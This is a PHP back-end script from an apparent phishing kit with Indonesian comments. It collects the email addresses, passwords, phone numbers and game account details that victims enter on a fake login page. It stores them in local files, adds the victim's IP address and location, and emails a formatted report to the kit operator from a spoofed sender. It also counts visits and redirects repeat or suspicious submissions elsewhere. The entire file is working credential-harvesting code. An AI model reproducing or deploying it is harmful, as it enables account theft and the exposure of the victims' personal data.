<?php
// MENGAMBIL KONTROL
include 'system/lenzzip.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$pass = $_POST['pass'];
$level = $_POST['level'];
$phone = $_POST['phone'];
$playid = $_POST['playid'];
$server = $_POST['server'];
$login = $_POST['login'];

$deviceInfo = $infos['platfrm_name'];
$osVersionInfo = $infos['platfrm_vers'];
$browserInfo = $infos['browser_name'];

$file_lines = file('system/antispam.txt');
        foreach ($file_lines as $file => $value) {
            $data = explode("|", $value);
            if (in_array($email, $data)) {
                // Redirect and set session
                $_SESSION['email'] = $email;
                header('Location: ');
                exit;
            }
        }

        $myfile = fopen("system/antispam.txt", "a") or die("Unable to open file!");
        fwrite($myfile, "|".$email."|".$password."\n");
        fclose($myfile);
        
$redirectUrl = "https://yandex.com"; 

if (preg_match('/https?:\/\/|www\./i', $email) || preg_match('/https?:\/\/|www\./i', $sandi)) {
    header("Location: $redirectUrl");
    exit();
}

$usedFile = "system/used.json";
if (!file_exists($usedFile)) {
    file_put_contents($usedFile, "{}");
}
$existingData = file_get_contents($usedFile);
$usedList = json_decode($existingData, true);

$uniqueKey = md5($email . '|' . $sandi);

if (isset($usedList[$uniqueKey])) {
    header("Location: $redirectUrl");
    exit();
} else {
    $usedList[$uniqueKey] = [
        "email" => $email,
        "sandi" => $sandi,
        "time" => date("Y-m-d H:i:s")
    ];
    file_put_contents($usedFile, json_encode($usedList, JSON_PRETTY_PRINT));
}

$subjek = "$lenzz_countryCode - $lenzz_flag | +$lenzz_callcode | LEVEL $level | LOGIN $login | IP $lenzz_ipaddress";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
			    <tr>
					<th style="text-align: center;" colspan="3">Info Login $login</th>
				</tr>
				<tr>
					<td style="border-center: none;">Email/Nomor</td>
					<td style="text-align: center;">$email</td>
				</tr>
                <tr>
					<td style="border-center: none;">Password</td>
					<td style="text-align: center;">$password</td>
				</tr>
				<tr>
					<td style="border-center: none;">Login</td>
					<td style="text-align: center;">$login</td>
				</tr>
				<tr>
					<td style="border-center: none;">ID Akun</td>
					<td style="text-align: center;">$playid</td>
				</tr>
				<tr>
					<td style="border-center: none;">Nomor</td>
					<td style="text-align: center;">$phone</td>
				</tr>
				<tr>
					<td style="border-center: none;">Level</td>
					<td style="text-align: center;">$level</td>
				</tr>
				<tr>
				<td style="border-right: none;">IP Address</td>
					<td style="text-align: center;">$lenzz_ipaddress</td>
				</tr>
                <tr>
                <th style="text-align: center;" colspan="3">Informasi Detail</th>
				</tr>
				<tr>
					<td style="border-center: none;">Region</td>
					<td style="text-align: center;">$lenzz_regionName</td>
				</tr>
				<tr>
					<td style="border-center: none;">City</td>
					<td style="text-align: center;">$lenzz_city</td>
				</tr>
				<tr>
					<td style="border-center: none;">Isp Info</td>
					<td style="text-align: center;">$lenzz_isp</td>
				</tr>
				<tr>
					<td style="border-center: none;">Asn Info</td>
					<td style="text-align: center;">$lenzz_as</td>
				</tr>
				<tr>
				<td style="border-right: none;">Country</td>
					<td style="text-align: center;">$lenzz_country</td>
				<tr>
				<th style="text-align: center;" colspan="3">© CAHYO SR II</th>
				</tr>
			</table>
		</div>
	</body>
</html>
EOD; 
// Get Today Date
$Tget = file_get_contents("data/visitor.json");
$Tdecode = json_decode($Tget,true);
$today = $Tdecode['today'] + 1;
$Tdecode['today'] = $today;
$Tresult = json_encode($Tdecode);
            $Tfile = fopen('data/visitor.json','w');
                     fwrite($Tfile,$Tresult);
                     fclose($Tfile);
                     
// Yesterday 
if(date("H:i") == "01:00"){
$Yget = file_get_contents("data/visitor.json");
$Ydecode = json_decode($Yget,true);
$Ydecode['yesterday'] = $Ydecode['today'];
$Ydecode['today'] = 0;
$Yresult = json_encode($Ydecode);
            $Yfile = fopen('data/visitor.json','w');
                     fwrite($Yfile,$Yresult);
                     fclose($Yfile);
}

// All Over
$Aget = file_get_contents("data/visitor.json");
$Adecode = json_decode($Aget,true);
$all = $Adecode['total'] + 1;
$Adecode['total'] = $all;
$Aresult = json_encode($Adecode);
            $Afile = fopen('data/visitor.json','w');
                     fwrite($Afile,$Aresult);
                     fclose($Afile);

// Result Data
$resultGet = file_get_contents("data/data.json");
$resultData = json_decode($resultGet,true);

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: '.$resultData['nama'].' <admin@sendora.my.id>' . "\r\n";

if(mail($resultData['email'], $subjek, $pesan, $headers))
include '../../lok.php';

{
$upGet = file_get_contents("data/data.json");
$upData = json_decode($upGet,true);
$hasil = $upData['totals'] + 1;
$upData['totals'] = $hasil;
$upResult = json_encode($upData);
$upFile = fopen('data/data.json','w');
          fwrite($upFile,$upResult);
          fclose($upFile);
}
?>